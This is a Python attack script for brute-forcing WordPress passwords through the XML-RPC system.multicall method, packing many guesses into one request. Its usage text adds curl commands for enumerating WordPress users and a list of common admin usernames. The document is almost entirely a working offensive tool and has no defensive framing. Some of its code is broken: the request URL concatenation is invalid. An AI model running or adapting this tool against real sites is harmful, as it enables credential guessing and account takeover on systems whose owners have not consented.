import sys
import requests
from requests_toolbelt import MultipartEncoder
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {"https":"http://127.0.0.1:8080"}

headers={
'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
}



if len(sys.argv)!=3:
	print("# xmlrpc api multicall method to brutforce multiple passwords in one request.\n")
	print("# Usage: python3 %s <password file> <target>"%sys.argv[0])
	print("\tUsername---> see comments, i was lazy\n")
	print("\tPassword File---> either use linux split {split -l 10000 [file to split] [new file basename] } \n\tor swap logic with commented code\n")
	print("\tTarget---> https://wordpress.alldomains.org/\n")
	print("""\t*Wordpress USER ENUM*

\t1) /author?=[insert numbers]
\tfor i in $(seq 1 100);do curl "https://[target]/?author?=${i}";done

\t2) curl -X GET "https://[target]/wp-json/wp/v2/users

\t3) Common Users: wp-admin, site2admin, admin, administrator
		""")
	sys.exit()


#print("[+] opening file for write...")
#logfile=open('xmlbruteforce.log','w')
passwords=sys.argv[1]
print("[+] opening passwords file...")
try:
	passwordfile=open(passwords,'r')
except:
	print("[!] cant open file")
	sys.exit()

print("[+] writing payload...")


payload=""
count=0
logfile=open('wordpress_bruteforce_results.txt','w')
username=''  # search for 'USERNAMEYO' and replace
target=sys.argv[2] 

for pwd in passwordfile.readlines():
	goodpass=True #my target didnt have the function to parse special chars, so i had to strip them to avoid malformed request errors from the parser
	for char in pwd.strip():
		if not char.isalnum():
			goodpass=False

	if (len(pwd) > 8) and goodpass:
		payload+="<value><struct><member><name>methodName</name><value><string>wp.uploadFile</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>1</string></value><value><string>USERNAMEYO</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value> <value><struct><member><name>methodName</name><value><string>wp.uploadFile</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>1</string></value><value><string>USERNAMEYO</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>"%(pwd,pwd)
	
	else:
		pass

payloadhead='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>%s</data></array></value></param></params></methodCall>'%payload
try:
	req=requests.post(target+xmlrpc.php,headers=headers,data=payloadhead.encode('utf-8'),proxies=proxy,verify=False)
	#logfile.write(req.text)
	print("...working...")

except Exception as e:
	print(e)


passwordfile.close()
logfile.close()

print("[+] Done...")



''' # if not splitting files use code below... might need to adjust count, worked for me with 10k. 

for pwd in passwordfile.readlines():
	goodpass=True
	for char in pwd:
		if not char.isalnum():
			goodpass=False

	if (len(pwd) > 8) and goodpass:
		payload+="<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>USERNAMEYO</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>\n<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>USERNAMEYO</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>"%(pwd,pwd)

		if(count==10000):
			payloadhead='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>%s</data></array></value></param></params></methodCall>'%payload
			try:
				req=requests.post(target+xmlrpc.php,headers=headers,data=payloadhead,proxies=proxy,verify=False)
				if "blogName" in req.text:
					#print(req.text)
					print("[!] POSSIBLE PASSWORD...SEE ABOVE")
					wait=input()
					logfile.write(req.text)
				elif "blog" in req.text:
					#print(req.text)
					print("[!] POSSIBLE PASSWORD...SEE ABOVE")
					wait=input()
					logfile.write(req.text)
				else:
					print("...working...")

			except Exception as e:
				print(e)
			

			count=0
			payload=""
		else:
			count+=1
	else:
		pass
'''





